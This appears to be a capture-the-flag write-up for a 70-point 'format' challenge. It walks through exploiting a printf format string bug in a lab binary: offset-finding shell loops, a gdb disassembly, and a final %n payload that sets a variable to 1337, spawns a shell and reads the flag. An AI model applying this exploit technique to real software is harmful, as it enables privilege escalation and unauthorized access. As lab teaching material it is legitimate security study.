### Solved by et0x

Format is a 70 point binary exploitation challenge. 

> This program is vulnerable to a format string attack! See if you can modify a variable by supplying a format string! The binary can be found at /home/format/ on the shell server. The source can be found here. 

The source of the binary is as follows:

```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>

int secret = 0;

void give_shell(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
    system("/bin/sh -i");
}

int main(int argc, char **argv){
    int *ptr = &secret;
    printf(argv[1]);

    if (secret == 1337){
        give_shell();
    }
    return 0;
}
```
So we need to somehow find a way to change the value of secret to 1337, using a format string attack because the printf() function isn't correctly implemented.  Well first thing's first, lets find out what the stack looks like.

*note: the environment variables mess with the stack in this problem, so do yourself a favor by prepending the command with 'env -i' to clear the environment before running the command.*
```bash
pico1139@shell:/home/format$ for i in {1..256};do echo -n "Offset: $i:"; env -i ./format AAAA%$i\$x;echo ;done | grep 4141
Offset: 105:AAAA41414141
```

This means we can see our input at offset 105 from the top of the stack.  However, as you add more data, the offset of your original input changes, so go ahead and add 1333 more bytes of data and see what the offset is then.  (1337 is what we want to put into secret, and we will have written four bytes (AAAA), so 1333+4 = 1337)

```bash
for i in {1..256};do echo -n "Offset: $i:"; env -i ./format AAAA%$i\$x%1333u;echo ;done | grep 4141
Offset: 103:AAAA41410074
Offset: 104:AAAA31254141
```

So we found our A's again, but they aren't aligned on the stack.  Lets add two more A's at the end to see if we can get it to line up.

```bash
for i in {1..256};do echo -n "Offset: $i:"; env -i ./format AAAA%$i\$x%1333uAA;echo ;done | grep 41414141
Offset: 103:AAAA41414141
```

Great! Our offset is 103.  Now we need to find out what address to use to change the data in "secret"

```
pico1139@shell:/home/format$ gdb -q format
Reading symbols from format...(no debugging symbols found)...done.
(gdb) disass main
Dump of assembler code for function main:
   0x080484e2 <+0>:	push   %ebp
   0x080484e3 <+1>:	mov    %esp,%ebp
   0x080484e5 <+3>:	and    $0xfffffff0,%esp
   0x080484e8 <+6>:	sub    $0x20,%esp
   0x080484eb <+9>:	movl   $0x804a030,0x1c(%esp)
   0x080484f3 <+17>:	mov    0xc(%ebp),%eax
   0x080484f6 <+20>:	add    $0x4,%eax
   0x080484f9 <+23>:	mov    (%eax),%eax
   0x080484fb <+25>:	mov    %eax,(%esp)
   0x080484fe <+28>:	call   0x8048350 <printf@plt>
   0x08048503 <+33>:	mov    0x804a030,%eax
   0x08048508 <+38>:	cmp    $0x539,%eax
   0x0804850d <+43>:	jne    0x8048514 <main+50>
   0x0804850f <+45>:	call   0x80484ad <give_shell>
   0x08048514 <+50>:	mov    $0x0,%eax
   0x08048519 <+55>:	leave  
   0x0804851a <+56>:	return
```

It looks like the address **0x0804a030** is getting placed in *ptr.  That's the address we need to use in place of our A's.  In order to place the number 1337 into secret's memory address, we need to use the %n modifier. (%103$n will look at the data located at offset 103 as a memory address, and write the total number of bytes we have written so far into that address.)


```bash
pico1139@shell:/home/format$ env -i ./format $(python -c 'print "\x30\xa0\x04\x08"+"%1333u%103$nAA"')
$ id
uid=11066(pico1139) gid=1008(format) groups=1017(picogroup)
$ ls
Makefile  flag.txt  format  format.c
$ cat flag.txt
who_thought_%n_was_a_good_idea?
```
